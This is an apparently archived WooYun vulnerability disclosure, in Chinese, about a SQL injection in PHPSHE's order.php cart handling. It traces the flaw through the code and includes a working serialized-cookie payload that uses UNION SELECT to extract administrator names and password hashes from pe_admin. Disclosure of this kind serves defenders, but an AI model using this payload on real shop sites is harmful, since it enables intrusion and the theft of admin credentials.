{"id": 55851, "wybug_id": "wooyun-2014-059775", "wybug_title": "PHPSHE某处SQL注入漏洞", "wybug_corp": "phpshe.com", "wybug_author": "xfkxfk", "wybug_date": "2014-05-07 15:24", "wybug_open_date": "2014-08-02 15:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-12：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向公众公开  简要描述： ~~~ 详细说明：  文件order.php\n//#####################@ 订单增加 @#####################//\tcase 'add':\t\t$cart_info = cart_info(unserialize($_c_cart_list));\t\t$info_list = $cart_info['list'];\t\t$money = $cart_info['money'];\n$cart_info = cart_info(unserialize($_c_cart_list));这里的$_c_cart_list就是Cookie中的cart_list反序列化后进入cart_info函数。跟进cart_info函数\n//购物车商品列表和价格function cart_info($_c_cart_list=array()) {\tglobal $db;\tif (pe_login('user')) {\t\t$sql = \"select a.`product_num`, b.`product_id`, b.`product_name`, b.`product_logo`, b.`product_smoney`, b.`product_wlmoney`, b.`product_num` as `product_maxnum` from `\".dbpre.\"cart` a, `\".dbpre.\"product` b where a.`product_id` = b.`product_id` and a.`user_id` = '{$_SESSION['user_id']}'\";\t\t$info_list = $db->sql_selectall($sql);\t}\telse {\t\tif (is_array($_c_cart_list)) {\t\t\tforeach ($_c_cart_list as $k => $v) {\t\t\t\t$product_rows = $db->pe_select('product', array('product_id'=>$k), '`product_name`, `product_logo`, `product_smoney`, `product_wlmoney`, `product_num` as `product_maxnum`');\t\t\t\t$info_list[] = array_merge($v, $product_rows);\t\t\t}\t\t}\t}\tforeach ((array)$info_list as $v) {\t\t$money['order_productmoney'] += $v['product_num'] * $v['product_smoney'];\t\t$money['order_wlmoney'] += $v['product_wlmoney'];\t}\t$money['order_money'] = number_format($money['order_wlmoney'] + $money['order_productmoney'], 1, '.', '');\t$money['order_productmoney'] = number_format($money['order_productmoney'], 1, '.', '');\t$money['order_wlmoney'] = number_format($money['order_wlmoney'], 1, '.', '');\treturn array('list'=>(array)$info_list, 'money'=>$money);}\n在没有登陆的情况下$_c_cart_list as的$k进入了SQL语句：$db->pe_select('product', array('product_id'=>$k), '`product_name`, `product_logo`, `product_smoney`, `product_wlmoney`, `product_num` as `product_maxnum`');我们跟进pe_select函数\npublic function pe_select($table, $where = '', $field = '*')\t{\t\t//处理条件语句\t\t$sqlwhere = $this->_dowhere($where);\t\treturn $this->sql_select(\"select {$field} from `\".dbpre.\"{$table}` {$sqlwhere} limit 1\");\t}......protected function _dowhere($where)\t{\t\tif (is_array($where)) {\t\t\tforeach ($where as $k => $v) {\t\t\t\tif (is_array($v)) {\t\t\t\t\t$where_arr[] = \"`{$k}` in('\".implode(\"','\", $v).\"')\";\t\t\t\t\t\t\t}\t\t\t\telse {\t\t\t\t\tin_array($k, array('order by', 'group by')) ? ($sqlby = \" {$k} {$v}\") : ($where_arr[] = \"`{$k}` = '{$v}'\");\t\t\t\t}\t\t\t}\t\t\t$sqlwhere = is_array($where_arr) ? 'where '.implode($where_arr, ' and ').$sqlby : $sqlby;\t\t}\t\telse {\t\t\t$where && $sqlwhere = (stripos(trim($where), 'order by') === 0 or stripos(trim($where), 'group by') === 0) ? \"{$where}\" : \"where 1 {$where}\";\t\t}\t\treturn $sqlwhere;\t}\n最后array('product_id'=>$k)中的$k进入了SQL语句，最为`{$k}` = '{$v}'中的'{$v}'。我们来整理思路：1、从Cookie中取出cart_list的值，即为$_c_cart_list的值2、将$_c_cart_list的内容反序列化后进入cart_info函数3、在cart_info函数中$_c_cart_list的key进入了SQL语句4、$_c_cart_list的key在执行SQL语句时作为value执行在整个过程中都没有对最终进入SQL的value进行过滤，导致我们修改Cookie中cart_list的值，最后进入SQL语句，导致注入。   漏洞证明：  第一步添加一个物品到购物车：http://localhost/phpshe/index.php?mod=order&act=cartadd&product_id=1&product_num=1然后访问购物车：http://localhost/phpshe/index.php?mod=order&act=add此时购物车已经有一个物品了第二步我们来修改Cookie中的cart_list的内容：此时购物车已经有一个物品，这是Cookie中的cart_list的值为：\na:1:{i:1;a:3:{s:10:\"cart_atime\";i:1399441807;s:10:\"product_id\";i:1;s:11:\"product_num\";i:1;}}\n反序列化后的值为：\nArray ( [1] => Array ( [cart_atime] => 1399441807 [product_id] => 1 [product_num] => 1 ) )\n反序列化后这里的key为1.我们将反序列化后的cart_list的key修改为-1'union select concat(admin_name, 0x23, admin_pw),2,3,4,5 from pe_admin#，修改后的cart_list值为：\nArray ( [-1'union select concat(admin_name, 0x23, admin_pw),2,3,4,5 from pe_admin#] => Array ( [cart_atime] => 1399441807 [product_id] => 1 [product_num] => 1 ) )\n然后再将修改后的cart_list的值序列化，序列化后cart_list的值为：\na:1:{s:73:\"-1'union select concat(admin_name, 0x23, admin_pw),2,3,4,5 from pe_admin#\";a:3:{s:10:\"cart_atime\";i:1399441807;s:10:\"product_id\";i:1;s:11:\"product_num\";i:1;}}\n最后将上面的值带入Cookie中：\n\n访问http://localhost/phpshe/index.php?mod=order&act=add页面即可：\n\n   修复方案：  过滤，转义   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-02 15:26 厂商回复：  最新状态： 2014-05-19：感谢@xfkxfk 提供代码审计，sql注入漏洞已修复！  ", "replys": "漏洞评价：\n评论\n     2014-07-15 11:06 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  仔细看了看，好棒的思路，序列化和反序列化用处还真多    \n     2014-11-19 21:51 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  应该是5个字段    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}